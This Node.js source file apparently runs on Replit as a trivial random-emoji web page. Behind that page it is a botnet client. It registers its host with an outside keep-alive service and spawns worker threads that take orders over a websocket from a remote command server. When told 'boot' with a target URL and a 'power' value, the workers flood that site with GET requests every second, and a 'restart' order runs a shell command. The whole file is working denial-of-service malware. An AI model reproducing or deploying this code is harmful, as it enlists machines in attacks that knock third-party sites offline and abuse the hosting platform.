const io = require("socket.io-client");
const express = require('express')
const axios = require('axios')
const readline = require('readline');

const { Worker, isMainThread, workerData } = require('worker_threads')
const emojis = require('./emojis.json')
if (isMainThread) {
var app = express()
var randFromArr = (arr) => {
  return arr[Math.floor(Math.random() * arr.length)]
}

app.get("/", async (req, res) => {
  var e = ''
  for (i = 0; i < 10; i++) e += randFromArr(emojis);
  res.end(`<head><meta name="og:title" value="${e}"></head><h1 style="font-size:10vw">${e}</h1>`)
})
async function cringe() {
  await axios.get("https://ping.iEp0KJuM6sitY5e.repl.co/add?url=https://" + process.env.REPL_SLUG + "." + process.env.REPL_OWNER + ".repl.co")
  console.log("ADDED")
}
cringe()
app.listen(4000)
for (i=0;i<Math.floor(require('os').cpus().length/2.5);i++) new Worker(__filename, {workerData:i}), console.log(i, 'worker')
} else {
var url = ''
var pow = 0

const socket = io("wss://server2-1.iep0kjum6sity5e.repl.co", {
  reconnection: true,
  reconnectionAttempts: 10000,
  reconnectionDelay: 6000,
  reconnectionDelayMax: 100000,
});

setInterval(() => {
  if (url == 'undefined') return console.log('no site')
  for (i = 0; i < pow; i++) {
    axios.get(url).catch(err => { console.log("maybe its down or we got ip banned lol.", url, workerData) }).then(()=>{
      console.log('sent')
    })
    axios.get(url).catch(err => { console.log("maybe its down or we got ip banned lol.", url, workerData) }).then(()=>{
      console.log('sent')
    })
    axios.get(url).catch(err => { console.log("maybe its down or we got ip banned lol.", url, workerData) }).then((r)=>{
      //console.log(r.data)
      console.log('sent')
    })
  }
}, 1000)

socket.on('message', async m => {
  console.log(m)
  if (m == 'restart') require('child_process').exec('npm restart')
  if (m.substr(0, 5) == "boot^") {
    var args = m.split('^').slice(1)
    var u = args[0]
    var p = args[1]
    console.log("Booting: " + u + " with power: " + p)
    url = u
    console.log(url, 'changed')
    pow = p
  }
})
socket.on('connect', function() {
  console.log("e")
});
function reconnect() {
  socket = null;
  console.log("reconnecting lol")
  var socket = io("wss://server2-1.iep0kjum6sity5e.repl.co", {
    reconnectionDelayMax: 30000,
    // keep this
  });
}
socket.on('disconnect', () => { setTimeout(() => { console.log("r") }, 6000) })
}
